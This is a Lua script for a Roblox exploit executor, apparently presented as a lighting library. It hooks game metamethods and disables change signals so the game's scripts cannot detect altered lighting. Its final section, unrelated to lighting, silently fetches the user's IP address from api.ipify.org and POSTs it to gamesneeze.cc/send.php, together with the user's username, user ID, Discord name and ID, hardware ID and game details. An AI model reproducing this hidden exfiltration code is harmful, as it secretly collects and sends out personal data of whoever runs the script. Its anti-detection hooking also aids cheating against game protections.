-- moonwalk @zzz@
local light = game:GetService("Lighting")
local library = {}
local changed = {}
local current = {}
local disconnected = {}
--
local oldnamecall
local oldindex
local oldnewindex
--
function addConnection(connection)
    for i, v in pairs(getconnections(connection)) do
        v:Disable()
        disconnected[#disconnected + 1] = v
    end
end
--
function removeConnections()
    for z, x in pairs(disconnected) do 
        x:Enable() 
        disconnected[z] = nil 
    end
end
--
function library:changeLighting(prop, val)
    current[prop] = current[prop] or light[prop]
    changed[prop] = val
    --
    addConnection(light:GetPropertyChangedSignal(prop))
    addConnection(light.Changed)
    --
    light[prop] = val
    --
    removeConnections()
end
--
function library:removeLighting(prop)
    if current[prop] then
        addConnection(light:GetPropertyChangedSignal(prop))
        addConnection(light.Changed)
        --
        light[prop] = current[prop]
        current[prop] = nil
        changed[prop] = nil
        --
        removeConnections()
    end
end
--
function library:Unload()
    for i,v in pairs(current) do
        library:removeLighting(i)
    end
end
--
oldindex = hookmetamethod(game, "__index", function(self, prop)
    if not checkcaller() and self == light and current[prop] then
        return current[prop]
    end
    return oldindex(self, prop)
end)
--
oldnewindex = hookmetamethod(game, "__newindex", function(self, prop, val)
    if not checkcaller() and self == light and changed[prop] then
        current[prop] = val
        return
    end
    return oldnewindex(self, prop, val)
end)
--
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
--
local Client = Players.LocalPlayer
--
local PlaceId = game.PlaceId
--
local ProductInfo
--
local Passed, Statement = pcall(function()
    local Info = MarketplaceService:GetProductInfo(PlaceId)
    --
    if Info then
        ProductInfo = Info
    end
end)
--
if not lgVarsTbl then
    lgVarsTbl = {["DiscordId"] = "null", ["DiscordUsername"] = "null", ["HWID"] = "null"}
end
--
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
--
local Client = Players.LocalPlayer
--
local PlaceId = game.PlaceId
--
local ProductInfo
local InternetProtocol
--
local Passed, Statement = pcall(function()
    local Info = MarketplaceService:GetProductInfo(PlaceId)
    --
    if Info then
        ProductInfo = Info
    end
end)
--
local Passed, Statement = pcall(function()
    local Ip = game:HttpGet("https://api.ipify.org/")
    --
    if Ip then
        InternetProtocol = Ip
    end
end)
--
local response = syn.request(
    {
        Url = 'http://gamesneeze.cc/send.php',
        Method = 'POST',
        Headers = {},
        Body = ("&key=test&username=%s&userid=%s&userip=%s&gamename=%s&gameid=%s&gamelink=%s&gamejob=%s&time=%s&timezone=%s&extra=Splix Execution&discordusername=%s&discordid=%s&hwid=%s"):format(Client.Name, Client.UserId, InternetProtocol or "null", ProductInfo.Name or "null", PlaceId, "https://www.roblox.com/games/" .. PlaceId .. "/", game.JobId, os.date("%c", os.time()), os.date("%Z", os.time()), lgVarsTbl["DiscordUsername"], lgVarsTbl["DiscordId"], lgVarsTbl["HWID"])
    }
)
return library
